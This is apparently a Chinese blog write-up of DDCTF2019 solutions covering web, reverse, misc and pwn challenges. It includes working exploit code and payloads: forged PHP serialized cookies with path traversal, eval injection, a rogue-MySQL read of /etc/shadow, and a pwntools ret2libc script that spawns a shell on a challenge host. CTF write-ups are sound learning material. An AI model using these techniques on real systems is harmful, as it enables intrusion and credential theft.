<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>DDCTF2019 Writeup - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="历时 N 天, 滴滴终于审完了 Writeup, 终于可以发 wp 了, 我从 33 名到 16 名, 太真实了&mldr;
部分题目质量还是不错的 _(:з」∠)_, 因为要交上去, 所以就没截图了, 凑合看吧 (逃"><meta property="og:image" content><meta property="og:title" content="DDCTF2019 Writeup"><meta property="og:description" content="历时 N 天, 滴滴终于审完了 Writeup, 终于可以发 wp 了, 我从 33 名到 16 名, 太真实了&mldr;
部分题目质量还是不错的 _(:з」∠)_, 因为要交上去, 所以就没截图了, 凑合看吧 (逃"><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2019/04/25/DDCTF2019-Writeup/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-04-25T00:17:49+00:00"><meta property="article:modified_time" content="2019-04-25T00:17:49+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="DDCTF2019 Writeup"><meta name=twitter:description content="历时 N 天, 滴滴终于审完了 Writeup, 终于可以发 wp 了, 我从 33 名到 16 名, 太真实了&mldr;
部分题目质量还是不错的 _(:з」∠)_, 因为要交上去, 所以就没截图了, 凑合看吧 (逃"><script src=https://rmb122.com/js/feather.min.js></script>
<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.21410c161c7e5bcadc5a4eccf49ce5a024e0e8fc19babbd534cfe87972f5ee51.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
<a href=/tags>标签</a>&nbsp;
<a href=/posts>归档</a>&nbsp;
<a href=/about>关于</a>&nbsp;
<a href=/links>友链</a>
| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>DDCTF2019 Writeup</h1><div class=meta>发表于 2019 年 4 月 25 日</div></div><section class=body><p>历时 N 天, 滴滴终于审完了 Writeup, 终于可以发 wp 了, 我从 33 名到 16 名, 太真实了&mldr;<br>部分题目质量还是不错的 _(:з」∠)_, 因为要交上去, 所以就没截图了, 凑合看吧 (逃</p><h1 id=web>Web</h1><h2 id=滴>滴~</h2><p><code>http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code> 中 <code>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code><br>可以看出来是双层 base64 + 一层 base16, 解码得到 flag.jpg, 那么可以得到 index.php 就是 <code>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code>,<br>就可以直接读源码了, 然而并没有 flag, 也不能读 config.php,<br>跟着注释中的网址 <code>https://blog.csdn.net/FengBanLiuYun/article/details/80616607</code> 可以在同作者底下找到 vim 学习记录, 找到 <code>.practice.txt.swp</code> 但是直接访问 404&mldr;,<br>各种姿势尝试发现是 <code>practice.txt.swp</code>&mldr; 有毒, 得到 <code>f1ag!ddctf.php</code> 的提示, 用 <code>f1agconfigddctf.php</code> 绕过, 得到源码,<br>用 <code>f1ag!ddctf.php?k=data:,123&uid=123</code> 即可绕过, 得到 flag.</p><h2 id=web-签到题>WEB 签到题</h2><p>在 <code>/js/index.js</code> 找到验证逻辑, 通过 <code>didictf_username</code> 的 <code>header</code> 来验证, 随便试了个 <code>admin</code> 就通过了,<br>得到下一步地址 <code>/app/fL2XID2i0Cdh.php</code>,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ff79c6>if</span>(<span style=color:#ff79c6>!</span><span style=color:#ff79c6>empty</span>(<span style=color:#8be9fd;font-style:italic>$_POST</span>[<span style=color:#f1fa8c>&#34;nickname&#34;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>$arr</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>array</span>(<span style=color:#8be9fd;font-style:italic>$_POST</span>[<span style=color:#f1fa8c>&#34;nickname&#34;</span>],<span style=color:#8be9fd;font-style:italic>$this</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>eancrykey</span>);
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>$data</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;Welcome my friend %s&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>foreach</span> (<span style=color:#8be9fd;font-style:italic>$arr</span> <span style=color:#ff79c6>as</span> <span style=color:#8be9fd;font-style:italic>$k</span> <span style=color:#ff79c6>=&gt;</span> <span style=color:#8be9fd;font-style:italic>$v</span>) {
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>$data</span> <span style=color:#ff79c6>=</span> sprintf(<span style=color:#8be9fd;font-style:italic>$data</span>,<span style=color:#8be9fd;font-style:italic>$v</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>parent</span><span style=color:#ff79c6>::</span><span style=color:#50fa7b>response</span>(<span style=color:#8be9fd;font-style:italic>$data</span>,<span style=color:#f1fa8c>&#34;Welcome&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>让 nickname 为 %s 就可以拿到 key, 通过双写绕过替换. 然后构造 Cookie 反序列化就可以了, 脚本如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ff79c6>&lt;?</span>php
</span></span><span style=display:flex><span><span style=color:#ff79c6>Class</span> <span style=color:#50fa7b>Application</span> {
</span></span><span style=display:flex><span><span style=color:#6272a4>// ... 省略
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$a</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Application();
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$a</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>path</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;..././config/flag.txt&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$s</span> <span style=color:#ff79c6>=</span> serialize(<span style=color:#8be9fd;font-style:italic>$a</span>);
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$key</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;EzblrbNS&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$s</span> <span style=color:#ff79c6>.=</span> md5(<span style=color:#8be9fd;font-style:italic>$key</span> <span style=color:#ff79c6>.</span> <span style=color:#8be9fd;font-style:italic>$s</span>);
</span></span><span style=display:flex><span><span style=color:#ff79c6>echo</span> <span style=color:#8be9fd;font-style:italic>$s</span>; <span style=color:#6272a4>// O:11:&#34;Application&#34;:1:{s:4:&#34;path&#34;;s:21:&#34;..././config/flag.txt&#34;;}5a014dbe49334e6dbb7326046950bee2
</span></span></span></code></pre></div><p>把 <code>ddctf_id</code> 的值改成这个访问下就拿到 flag 了.</p><h2 id=upload-img>Upload-IMG</h2><p>目的很明确, 图片里面存在 <code>phpinfo()</code> 就给 flag随便传个图片, 下载下来发现有 <code>CREATOR: gd-jpeg</code>,<br>应该是在服务器端有二次处理, 不能通过 exif 啥的携带数据, 用 GIMP 创建一张 20x20 图片, 在本地测试了一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ff79c6>&lt;?</span>php
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$img</span> <span style=color:#ff79c6>=</span> imagecreatefromjpeg(<span style=color:#f1fa8c>&#39;/home/rmb122/gd.jpg&#39;</span>);
</span></span><span style=display:flex><span>imagejpeg(<span style=color:#8be9fd;font-style:italic>$img</span>, <span style=color:#f1fa8c>&#39;/home/rmb122/gd-out.jpg&#39;</span>, <span style=color:#bd93f9>80</span>);
</span></span></code></pre></div><p>010editor 可以解析格式, fuzz 发现在 ScanData 第三个字节后面写 phpinfo() 不会被处理掉, 传上去就拿到 flag 了.</p><h2 id=homebrew-event-loop>homebrew event loop</h2><p>审计源码, 发现</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>is_action <span style=color:#ff79c6>=</span> event[<span style=color:#bd93f9>0</span>] <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;a&#39;</span> 
</span></span><span style=display:flex><span>action <span style=color:#ff79c6>=</span> get_mid_str(event, <span style=color:#f1fa8c>&#39;:&#39;</span>, <span style=color:#f1fa8c>&#39;;&#39;</span>) 
</span></span><span style=display:flex><span>args <span style=color:#ff79c6>=</span> get_mid_str(event, action<span style=color:#ff79c6>+</span><span style=color:#f1fa8c>&#39;;&#39;</span>)<span style=color:#ff79c6>.</span>split(<span style=color:#f1fa8c>&#39;#&#39;</span>) 
</span></span><span style=display:flex><span><span style=color:#ff79c6>try</span>: 
</span></span><span style=display:flex><span>    event_handler <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>eval</span>(action <span style=color:#ff79c6>+</span> (<span style=color:#f1fa8c>&#39;_handler&#39;</span> <span style=color:#ff79c6>if</span> is_action <span style=color:#ff79c6>else</span> <span style=color:#f1fa8c>&#39;_function&#39;</span>)) 
</span></span><span style=display:flex><span>    ret_val <span style=color:#ff79c6>=</span> event_handler(args) 
</span></span><span style=display:flex><span><span style=color:#ff79c6>except</span> RollBackException:
</span></span></code></pre></div><p>取 event_handler 的时候没有过滤, 通过 <code>?action:funcname%23;...</code><br>也就是在名字后面加个 <code>#</code> 可以绕过必须有后缀的限制, 于是就可以构造<br><code>?action:trigger_event%23;action:buy;1000%23action:get_flag;1</code><br>就可以调用 <code>get_flag_handler</code> 了, 虽然不能直接得到 flag, 而且交易会回滚, 但是因为</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>trigger_event</span>(event): 
</span></span><span style=display:flex><span>    session[<span style=color:#f1fa8c>&#39;log&#39;</span>]<span style=color:#ff79c6>.</span>append(event) 
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>len</span>(session[<span style=color:#f1fa8c>&#39;log&#39;</span>]) <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>5</span>: session[<span style=color:#f1fa8c>&#39;log&#39;</span>] <span style=color:#ff79c6>=</span> session[<span style=color:#f1fa8c>&#39;log&#39;</span>][<span style=color:#ff79c6>-</span><span style=color:#bd93f9>5</span>:] 
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>type</span>(event) <span style=color:#ff79c6>==</span> <span style=color:#8be9fd;font-style:italic>type</span>([]): 
</span></span></code></pre></div><p>有 log 的原因, 而且会存在 session 里面, 而 flask 的 session 内的数据是存在 cookie 里面的,<br>通过 <a href=https://github.com/noraj/flask-session-cookie-manager>session_cookie_manager</a> 直接就可以解码, 得到在 log 里面的 flag.</p><h2 id=大吉大利今晚吃鸡>大吉大利,今晚吃鸡~</h2><p>通过浏览器插件 <code>wappalyzer</code> (应该是分析 Cookie 名称 <code>revel_session</code> 获取的) 可以得到后端是 go 写的,<br>盲猜有整数溢出, 最后试出来 <code>2 ** 32</code> 也就是 <code>4294967296</code> 可以溢出买到票, 里面比较迷,<br>还以为得什么洞拿到机器人的 token, 结果我自己又注册了个号, 发现可以直接自己移除自己&mldr;<br>然后写脚本不停自己移除自己就行了, 然后后端分配 id 还是在一个范围内随机的, 不是每次都是新 id, 而且访问速度还有限制<br>后面才能好久移除一个 233, 总之跑了好久移除完访问 <code>/index.html#/main/result</code> 直接拿到 flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>import</span> requests
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> random
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> time
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>act <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;rmb122&#39;</span>
</span></span><span style=display:flex><span>pwd <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;rmb122sudo ufw status numbered&#39;</span>
</span></span><span style=display:flex><span>mainSess <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>session()
</span></span><span style=display:flex><span>mainSess<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;http://117.51.147.155:5050/ctf/api/login?name=</span><span style=color:#f1fa8c>{</span>act<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&amp;password=</span><span style=color:#f1fa8c>{</span>pwd<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>1</span>,<span style=color:#bd93f9>999</span>):
</span></span><span style=display:flex><span>    tmpact <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;laioqoLKJHSLJDKHKJrmb122&#39;</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39;QAQ&#39;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>str</span>(i)
</span></span><span style=display:flex><span>    tmppwd <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;zxczxczxczxcczx&#39;</span>
</span></span><span style=display:flex><span>    tmp <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>session()
</span></span><span style=display:flex><span>    tmp<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;http://117.51.147.155:5050/ctf/api/register?name=</span><span style=color:#f1fa8c>{</span>tmpact<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&amp;password=</span><span style=color:#f1fa8c>{</span>tmppwd<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span>    tmp<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#39;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&#39;</span>)
</span></span><span style=display:flex><span>    bill <span style=color:#ff79c6>=</span> tmp<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#39;http://117.51.147.155:5050/ctf/api/search_bill_info&#39;</span>)<span style=color:#ff79c6>.</span>json()[<span style=color:#f1fa8c>&#39;data&#39;</span>][<span style=color:#bd93f9>0</span>][<span style=color:#f1fa8c>&#39;bill_id&#39;</span>]
</span></span><span style=display:flex><span>    tmp<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=</span><span style=color:#f1fa8c>{</span>bill<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span>    res <span style=color:#ff79c6>=</span> tmp<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#39;http://117.51.147.155:5050/ctf/api/search_ticket&#39;</span>)<span style=color:#ff79c6>.</span>json()
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>id</span> <span style=color:#ff79c6>=</span> res[<span style=color:#f1fa8c>&#39;data&#39;</span>][<span style=color:#bd93f9>0</span>][<span style=color:#f1fa8c>&#39;id&#39;</span>]
</span></span><span style=display:flex><span>    token <span style=color:#ff79c6>=</span> res[<span style=color:#f1fa8c>&#39;data&#39;</span>][<span style=color:#bd93f9>0</span>][<span style=color:#f1fa8c>&#39;ticket&#39;</span>]
</span></span><span style=display:flex><span>    res <span style=color:#ff79c6>=</span> mainSess<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;http://117.51.147.155:5050/ctf/api/remove_robot?id=</span><span style=color:#f1fa8c>{</span><span style=color:#8be9fd;font-style:italic>id</span><span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&amp;ticket=</span><span style=color:#f1fa8c>{</span>token<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#39;</span>)<span style=color:#ff79c6>.</span>json()
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span>(res)
</span></span><span style=display:flex><span>    time<span style=color:#ff79c6>.</span>sleep(<span style=color:#bd93f9>3</span>)
</span></span></code></pre></div><h2 id=mysql弱口令>mysql弱口令</h2><p>既然是客户端连服务端, 可以想到是 mysql 客户端的文件读取漏洞, 有现成的<a href=https://github.com/allyshka/Rogue-MySql-Server>项目</a><br>然后一开始没发现 <code>agent.py</code> 里面是用的 <code>netstat</code>, 我用普通用户权限跑过不了检测 233, 就先去做上面一题了,<br>之后看了下源码用 <code>root</code> 跑就没问题了, 成功读 <code>/etc/passwd</code>, 接下来直接尝试读 <code>/etc/shadow</code>, 竟然读的了, 应该是 root 权限跑的 bot,<br>然后读 <code>/root/.bash_history</code> 可以得到 bot 源码路径, 发现提示 <code># flag in mysql curl@localhost database:security table:flag</code>,<br>那么直接读数据库文件就可以了, <code>/var/lib/mysql/security/flag.ibd</code>, 拿到 flag.</p><h1 id=reverse>Reverse</h1><h2 id=windows-reverse1>Windows Reverse1</h2><p><code>upx -d</code> 直接脱壳, 但是不知道为什么跑不了 233, 最后还是用的 <code>ida</code> 动态调试原程序, 发现就是对输入的字符替换一下, 写个脚本就行</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>sbox <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;&#39;~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(</span><span style=color:#f1fa8c>\x27</span><span style=color:#f1fa8c>&amp;%$#&#34;! &#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>shift <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>32</span>
</span></span><span style=display:flex><span>revSbox <span style=color:#ff79c6>=</span> {}
</span></span><span style=display:flex><span>flag <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;DDCTF</span><span style=color:#f1fa8c>{reverseME}</span><span style=color:#f1fa8c>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> seq, i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>enumerate</span>(sbox):
</span></span><span style=display:flex><span>    revSbox[i] <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>chr</span>(<span style=color:#bd93f9>32</span> <span style=color:#ff79c6>+</span> seq)
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> flag:
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span>(revSbox[i], end<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;&#39;</span>)
</span></span></code></pre></div><h2 id=windows-reverse2>Windows Reverse2</h2><p>用了没听说过的壳, 于是就手动找 OEP 脱了, 然而也跑不了, 只能 F5 233, 不过这也足够了, 发现第一层<br>就是 hex2bin, 然后第二层用了 std::string, 看不出来是啥, 动态调发现其实就是个 base64encode, 结果是 <code>reverse+</code> 就通过<br>那么同样一个脚本搞定</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>import</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;reverse+&#39;</span>
</span></span><span style=display:flex><span>flag <span style=color:#ff79c6>=</span> base64<span style=color:#ff79c6>.</span>b64decode(flag)
</span></span><span style=display:flex><span>flag <span style=color:#ff79c6>=</span> base64<span style=color:#ff79c6>.</span>b16encode(flag)
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(flag)
</span></span></code></pre></div><h1 id=misc>MISC</h1><h2 id=真-签到题>真-签到题</h2><p>公告最底下就是啦</p><h2 id=北京地铁>北京地铁</h2><p>不得不说这题脑洞是真的大&mldr; <code>Stegsolve.jar</code> 可以直接提取出隐写的东西, 但是不知道有啥用&mldr;<br>最后提示三放出来以后, 谷歌搜图搜到原图, 发现把二号线的颜色给换了, <code>号</code> 和 <code>线</code> 字周围的颜色不一致就是没 PS 好,<br>233, 然后找了半天差别, 发现 <code>魏公村</code> 的颜色跟别的站点不一样, 随便试了一下拼音发现竟然就是秘钥, 惊了&mldr;<br>爆破了半天没出来, 没想到秘钥居然是这个.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>import</span> base64
</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> Crypto.Cipher <span style=color:#ff79c6>import</span> AES
</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> string <span style=color:#ff79c6>import</span> ascii_lowercase
</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> itertools <span style=color:#ff79c6>import</span> product
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>padding</span>(key):
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> key <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x00</span><span style=color:#f1fa8c>&#39;</span> <span style=color:#ff79c6>*</span> (<span style=color:#bd93f9>16</span> <span style=color:#ff79c6>-</span> <span style=color:#8be9fd;font-style:italic>len</span>(key) <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>16</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># for i in product(*([ascii_lowercase] * count)):</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># for count in range(1, 17):</span>
</span></span><span style=display:flex><span>i <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;weigongcun&#39;</span>
</span></span><span style=display:flex><span>c <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;iKk/Ju3vu4wOnssdIaUSrg==&#34;</span>
</span></span><span style=display:flex><span>c <span style=color:#ff79c6>=</span> base64<span style=color:#ff79c6>.</span>b64decode(c)
</span></span><span style=display:flex><span>a <span style=color:#ff79c6>=</span> AES<span style=color:#ff79c6>.</span>new(padding(i<span style=color:#ff79c6>.</span>encode()), AES<span style=color:#ff79c6>.</span>MODE_ECB)
</span></span><span style=display:flex><span>res <span style=color:#ff79c6>=</span> a<span style=color:#ff79c6>.</span>decrypt(c)
</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> res[:<span style=color:#bd93f9>2</span>] <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#34;DDCTF&#34;</span>:
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span>(i)
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(res)
</span></span></code></pre></div><h2 id=multzor>MulTzor</h2><p>感觉是 xor, 随手丢到之前看<a href=https://ctftime.org/writeup/3656>老外</a>做题发现的<a href=https://github.com/nccgroup/featherduster>工具</a>,<br>autopwn 一下直接就出 flag 了, 不得不说太强了.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>[+] Running multi-byte XOR brute force attack...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Best candidate decryptions for M�fjc�ab~Z[�2e...:
</span></span><span style=display:flex><span>----------------------------------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Trying keysize 24
</span></span><span style=display:flex><span>Processing chunk 24 of 78
</span></span><span style=display:flex><span>Trying keysize 18
</span></span><span style=display:flex><span>Processing chunk 42 of 78
</span></span><span style=display:flex><span>Trying keysize 36
</span></span><span style=display:flex><span>Processing chunk 78 of 78
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>....省略
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The flag is: DDCTF{07b1b46d1db28843d1fd76889fea9b36}
</span></span></code></pre></div><h2 id=pwn-strike>[PWN] strike</h2><p>read 不会在读取的数据后面加 \x00, 于是就可以通过 fprintf 泄露 setbuf 地址,<br>然后算出基地址. password 长度输 -1, 就可以绕过长度限制, 直接栈溢出, 之后就是 rop 了.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#ff79c6>=</span> remote(<span style=color:#f1fa8c>&#39;116.85.48.105&#39;</span>,<span style=color:#bd93f9>5005</span>)
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#39;username:&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>&#39;1&#39;</span><span style=color:#ff79c6>*</span> <span style=color:#bd93f9>40</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>t <span style=color:#ff79c6>=</span> p<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#39;Plea&#39;</span>)
</span></span><span style=display:flex><span>libcleak <span style=color:#ff79c6>=</span> u32(t[<span style=color:#bd93f9>0x33</span>:<span style=color:#bd93f9>0x37</span>])  
</span></span><span style=display:flex><span>stackButtom <span style=color:#ff79c6>=</span>  u32(t[<span style=color:#bd93f9>0x2f</span>:<span style=color:#bd93f9>0x33</span>])
</span></span><span style=display:flex><span>stack <span style=color:#ff79c6>=</span> stackButtom <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>0x18</span>
</span></span><span style=display:flex><span>libcbase <span style=color:#ff79c6>=</span> libcleak <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>0x00065465</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># print hex(stack)</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># print hex(libcbase)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#39;password:&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>sendline(<span style=color:#f1fa8c>&#39;-1&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#39;):&#39;</span>)
</span></span><span style=display:flex><span>binsh <span style=color:#ff79c6>=</span> libcbase <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>0x0015902B</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># execve = libcbase + 0x000AF590</span>
</span></span><span style=display:flex><span>system <span style=color:#ff79c6>=</span> libcbase <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>0x0003A940</span>
</span></span><span style=display:flex><span>payload <span style=color:#ff79c6>=</span> p32(stack)<span style=color:#ff79c6>*</span>((<span style=color:#bd93f9>0x4c</span><span style=color:#ff79c6>+</span><span style=color:#bd93f9>0x18</span>)<span style=color:#ff79c6>/</span><span style=color:#bd93f9>4</span> <span style=color:#ff79c6>-</span> <span style=color:#bd93f9>1</span>) <span style=color:#ff79c6>+</span> p32(system) <span style=color:#ff79c6>+</span> p32(binsh) <span style=color:#ff79c6>*</span><span style=color:#bd93f9>4</span>
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>send(payload)
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>interactive()
